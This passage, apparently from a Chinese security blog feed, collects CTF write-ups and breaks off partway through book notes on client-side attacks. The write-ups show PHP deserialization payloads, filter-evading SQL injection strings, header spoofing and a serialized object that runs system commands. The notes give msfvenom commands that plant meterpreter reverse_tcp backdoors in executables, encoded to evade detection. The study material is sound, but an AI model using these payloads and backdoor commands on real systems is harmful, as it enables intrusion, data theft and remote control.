    <url>/2021/10/18/%E4%BF%A1%E5%AE%89/CTF/Misc/GXUCTF-1%20MISC/</url>
    
    <content type="html"><![CDATA[<h1 id="GXUCTF-1-MISC"><a href="#GXUCTF-1-MISC" class="headerlink" title="GXUCTF-1 MISC"></a>GXUCTF-1 MISC</h1><h1 id="假的"><a href="#假的" class="headerlink" title="假的"></a>假的</h1><p>按照提示应该是伪加密，利用winhex修改对应的值后解压即可</p><p><img src="https://img2020.cnblogs.com/blog/2218130/202011/2218130-20201128181542824-1231058611.png"></p><p>改会00 00即可解压，之后获得图片很明显的提示修改图片高度</p><p>修改的时候可以先将本来的高度转化为十六进制后找到直接修改</p><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>根据提示拼图，应该是base64存储图片信息。直接利用html的图片输出可以进行拼接</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;data:image/gif;base64,&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">img</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>直接在base64,后面把内容加上去即可</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211018163857.png"></p><h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><p>是pcapng文件，用wireshark打开，之后根据提示搜索icmp协议的信息，再观察可以得到长度信息可能是flag，编写简单的python ascii码转字符即可得到(注意长度需要减去一个值)</p><h1 id="recover"><a href="#recover" class="headerlink" title="recover"></a>recover</h1><p>挂载磁盘，用winhex打开，然后恢复<code>信息安全.docx</code>文件，按照做题经验，修改后缀为zip。解压后打开word的document.xml文件，搜索gxu得到flag</p><h1 id="cat-png"><a href="#cat-png" class="headerlink" title="cat.png"></a>cat.png</h1><p>下载后利用binwalk命令 分析图片，再利用foremost分离图片得到一个zip包，图片使用lsb算法会得到密钥，解压后是表情加密，密码是文件名13.rot解密后得到flag</p>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GXUCTF_1-web</title>
    <link href="/2021/10/18/%E4%BF%A1%E5%AE%89/CTF/Web/GXUCTF-1%20web/"/>
    <url>/2021/10/18/%E4%BF%A1%E5%AE%89/CTF/Web/GXUCTF-1%20web/</url>
    
    <content type="html"><![CDATA[<h1 id="GXUCTF-1-web"><a href="#GXUCTF-1-web" class="headerlink" title="GXUCTF_1-web"></a>GXUCTF_1-web</h1><h1 id="五子棋"><a href="#五子棋" class="headerlink" title="五子棋"></a>五子棋</h1><p>直接下赢就行了</p><h1 id="反序列化之反序列化"><a href="#反序列化之反序列化" class="headerlink" title="反序列化之反序列化"></a>反序列化之反序列化</h1><p>访问链接后得到如下源码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment"># author: robot mini-ice</span><br><span class="hljs-comment"># flag in flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Uslz</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$first</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$second</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">canUpass</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;first == <span class="hljs-string">&quot;0&quot;</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;read();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no!no!no! &lt;br&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;second)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;yes!you did it! &lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">require_once</span>(<span class="hljs-keyword">$this</span>-&gt;second);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;first === <span class="hljs-string">&quot;0&quot;</span>)<br>            <span class="hljs-keyword">$this</span>-&gt;first = <span class="hljs-string">&quot;1&quot;</span>;<br><br>        <span class="hljs-keyword">$this</span>-&gt;canUpass();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    unserialize(<span class="hljs-variable">$str</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>设置其中的$first=0,$second=’flag.php’最后输出反序列化结果</p><p><code>O:4:&quot;Uslz&quot;:2:&#123;s:5:&quot;first&quot;;i:0;s:6:&quot;second&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p><p>带上该结果访问即可</p><p><a href="http://IP:Port/index.php?str=O:4:&quot;Uslz&quot;:2:{s:5:&quot;first&quot;;i:0;s:6:&quot;second&quot;;s:8:&quot;flag.php&quot;;}">http://IP:Port/index.php?str=O:4:&quot;Uslz&quot;:2:{s:5:&quot;first&quot;;i:0;s:6:&quot;second&quot;;s:8:&quot;flag.php&quot;;}</a></p><h1 id="To-be-admin-x2"><a href="#To-be-admin-x2" class="headerlink" title="To_be_admin_x2"></a>To_be_admin_x2</h1><p>访问题目地址后得到如下源码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/numfile/&#x27;</span>);<br><br><span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>===<span class="hljs-string">&quot;1638&quot;</span> || preg_match(<span class="hljs-string">&quot;/[.a-wyz]/i&quot;</span>, <span class="hljs-variable">$passwd</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no no,wrong passwd&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(intval(<span class="hljs-variable">$passwd</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">1638</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome! admin!&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span> == <span class="hljs-string">&#x27;flag.php&#x27;</span> || preg_match(<span class="hljs-string">&#x27;/:|\&quot;|\&#x27;| |\`/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no,don&#x27;t do that&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        show_source(<span class="hljs-variable">$file</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>审计代码后，$password需要不等于字符1638,转换为整形需要等于1638，之后的文件需要设置为访问flag.php，但是不能直接等于flag.php。按照提示使用十六进制转换，之后的使用字符<code>./flag.php</code>或者<code>../numfile/flag.php</code></p><p>payload</p><p>?p=0x666&amp;f=./flag.php</p><h1 id="To-be-admin-x0"><a href="#To-be-admin-x0" class="headerlink" title="To_be_admin_x0"></a>To_be_admin_x0</h1><p>访问题目地址后，发现是一个登录框，随意尝试登录，发现账户密码都为admin时登录成功，但是显示不是使用的学校浏览器访问。显然需要修改User-Agent为gxu</p><p>修改后访问发现提示不是本地管理员，一般判断ip地址的是X-Forwarded-For，添加后改为127.0.0.1得到flag</p><h1 id="反序列化之pop"><a href="#反序列化之pop" class="headerlink" title="反序列化之pop"></a>反序列化之pop</h1><p>目前题目出问题了无法访问，按照自己记得的写一下</p><p>首先是一个php魔法函数__wakeup的绕过，例如<code> O:4:&quot;test&quot;:3:&#123;s:11:&quot; test test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot; * test3&quot;;s:5:&quot;hello&quot;;&#125;</code>只需要将test后面这个3该的比3大就可以绕过，之后的按照代码走就行了，最后是大小写绕过System执行命令即可</p><h1 id="To-be-admin-x1"><a href="#To-be-admin-x1" class="headerlink" title="To_be_admin_x1"></a>To_be_admin_x1</h1><p>尝试一下得到admin和admin可以登录，之后尝试注入，按照基本注入流程走就行了。注入之后发现，空格和=还有直接小写不行，替换一下就行了</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">sql=<span class="hljs-string">&#x27;&#x27;</span><br>str_s=sql.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27; like &#x27;</span>).replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;/**/&#x27;</span>)<br><span class="hljs-built_in">print</span>(str_s.upper())<br></code></pre></div></td></tr></table></figure><p>利用联合查询获得库名</p><figure class="highlight gauss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gauss">username=ad&#x27;<span class="hljs-built_in">UNION</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">SELECT</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">DATABASE</span>(),<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-meta">#&amp;password=admin</span><br></code></pre></div></td></tr></table></figure><p>得到库名users2<del>其实没必要获得这个</del></p><p>获得表名 account,admin</p><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">username=ad&#x27;UNION<span class="hljs-comment">/**/</span><span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-keyword">DATABASE</span>(),(<span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**/</span>GROUP_CONCAT(TABLE_NAME)<span class="hljs-comment">/**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**/</span>INFORMATION_SCHEMA.TABLES<span class="hljs-comment">/**/</span><span class="hljs-keyword">WHERE</span><span class="hljs-comment">/**/</span>TABLE_SCHEMA<span class="hljs-comment">/**/</span><span class="hljs-keyword">LIKE</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">DATABASE</span>())#&amp;<span class="hljs-keyword">password</span>=admin<br></code></pre></div></td></tr></table></figure><p>最后获得admin的列名id,username,password,authority</p><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">username=ad&#x27;UNION<span class="hljs-comment">/**/</span><span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**/</span>GROUP_CONCAT(COLUMN_NAME)<span class="hljs-comment">/**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**/</span>INFORMATION_SCHEMA.COLUMNS<span class="hljs-comment">/**/</span><span class="hljs-keyword">WHERE</span><span class="hljs-comment">/**/</span>TABLE_SCHEMA<span class="hljs-comment">/**/</span><span class="hljs-keyword">LIKE</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">DATABASE</span>()<span class="hljs-comment">/**/</span><span class="hljs-keyword">AND</span><span class="hljs-comment">/**/</span>TABLE_NAME<span class="hljs-comment">/**/</span><span class="hljs-keyword">LIKE</span><span class="hljs-comment">/**/</span><span class="hljs-string">&quot;ADMIN&quot;</span>)#&amp;<span class="hljs-keyword">password</span>=admin<br></code></pre></div></td></tr></table></figure><p>最后获得具体内容</p><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">username=ad&#x27;UNION<span class="hljs-comment">/**/</span><span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**/</span>ID,USERNAME,<span class="hljs-keyword">PASSWORD</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**/</span>admin#&amp;<span class="hljs-keyword">password</span>=admin<br></code></pre></div></td></tr></table></figure><p>就很神奇，ADMIN大写的不出结果</p><p>最后利用得到的信息登录就行了</p>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网鼎杯 2020 朱雀组_phpweb 1</title>
    <link href="/2021/10/11/%E4%BF%A1%E5%AE%89/CTF/Web/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5Dphpweb-1/"/>
    <url>/2021/10/11/%E4%BF%A1%E5%AE%89/CTF/Web/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5Dphpweb-1/</url>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-朱雀组-phpweb-1"><a href="#网鼎杯-2020-朱雀组-phpweb-1" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb 1 "></a>[网鼎杯 2020 朱雀组]phpweb 1 </h1><p>访问对应的网址后，直接查看源码</p><p>发现有一个Post请求，抓包自己修改发送后报错，发现是利用call_user_func函数，并且可控其中的参数</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211011162752.png" alt="报错内容"></p><p>此时尝试将data换为system 参数为ls</p><p>返回内容显示为hack，应该是被过滤了，尝试了常见的执行函数，均无法使用。</p><p>此时尝试file_get_contents读取index.php文件</p><p>获得源码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>    <span class="hljs-variable">$result</span> = call_user_func(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>    <span class="hljs-variable">$a</span>= gettype(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-variable">$func</span> = strtolower(<span class="hljs-variable">$func</span>);<br>    <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> gettime(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>发现被过滤的很彻底，最起码我是找不到了，之后尝试查找其他类似函数无效，再试了下php的可变变量来运行还是不行</p><p>最后查看了一下wp，才发现有个明显的反序列化！！！！</p><p>之后构建对应的exp</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Test();<br><span class="hljs-variable">$a</span>-&gt;p=<span class="hljs-string">&#x27;ls&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;func=<span class="hljs-string">&#x27;system&#x27;</span>;<br>var_dump(serialize(<span class="hljs-variable">$a</span>))<br></code></pre></div></td></tr></table></figure><p>请求如下</p><p><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211011163507.png" alt="请求"></p><p>返回当前目录下的文件列表</p><p>之后尝试逐步查找flag<del>是没有写入权限，无法上Shell。</del></p><p>但是在参数添加空格后我本地的PHP出现了一些问题（即直接输出的内容多了一些空格！！）很疑惑，最开始还以为自己命令写错了，多次尝试后，并对比其他人的终于发现本地这个反序列化输出的内容多了一些空格导致不能运行！！</p><p>最后直接运行查找flag的命令，并读取即可，参考命令如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Test();<br><span class="hljs-comment"># 查找</span><br><span class="hljs-variable">$a</span>-&gt;p=<span class="hljs-string">&#x27;find / -name *flag*&#x27;</span>;<br><span class="hljs-comment"># 读取</span><br><span class="hljs-variable">$a</span>-&gt;p=<span class="hljs-string">&#x27;cat 文件具体路径&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;func=<span class="hljs-string">&#x27;system&#x27;</span>;<br>var_dump(serialize(<span class="hljs-variable">$a</span>))<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>客户端利用</title>
    <link href="/2021/10/08/%E4%B9%A6%E7%B1%8D/Kali%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%88%A9%E7%94%A8/"/>
    <url>/2021/10/08/%E4%B9%A6%E7%B1%8D/Kali%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="客户端利用"><a href="#客户端利用" class="headerlink" title="客户端利用"></a>客户端利用</h1><p>本章学习针对客户端应用程序的攻击策略。</p><p>客户端攻击的目标系统通常是缺乏安全控制装置（尤其是防火墙和入侵检测系统）的企业系统</p><p>本章将学习如何使用一下的方法(工具)攻击客户端应用程序</p><ul><li>后门可执行文件</li><li>执行恶意脚本攻击(CScript、VBScript和PowerShell)</li><li>利用浏览器开放框架(Browser Exploitation Framework,BeEF)</li><li>在渗透测试期间，配置跨站点脚本框架(Cross Site Scripting Framework,XSSF)</li></ul><h1 id="1-留后门的可执行文件"><a href="#1-留后门的可执行文件" class="headerlink" title="1. 留后门的可执行文件"></a>1. 留后门的可执行文件</h1><p>在本节中将学习利用msfvenom在任何可执行文件中植入后门</p><p>msfvenom是使用Metasploit msfpayload和msfencode的独立负载发生器</p><p>利用以下命令创建一个源文件的可执行文件，其中还包括一个带有IP地址的reverse_tcp负载</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp -k -x ./源文件 lhost=IP lport=Port -f exe -o ./输出文件.exe</code></p><p>对上述命令进行讲解：使用-p选项允许测试人员选择需要的负载以嵌入-k选项。将通过参加了另一个线程来克隆可执行文件的行为。即：将克隆程序并插入reverse_tcp负载。-x选项复制具有相同特征的可执行模板</p><p>还可以使用编码器使得攻击更加隐蔽，使用shikata_ga_nai编码的命令如下</p><p><code>msfvenom -a x86 --platform windows -x ./原文件 windows/meterpreter/reverse_tcp lhost=IP lport=Port -e x86/shikata_ga_nai -b &#39;\x00&#39; -f exe -o ./文件.exe</code></p><p>之后运行文件即可监听到连接。在不退出Metasploit控制台的情况下，重写有效负载、调回IP地址和端口号，以及停止后台会话都不可行，可以通过以下步骤创建一个简单的metasploit脚本来完成配置：</p><ol><li><p>用以下特定于Metasploit的命令来创建一个文件，并命名为listen：</p> <figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">use exploit/multi/handler<br><span 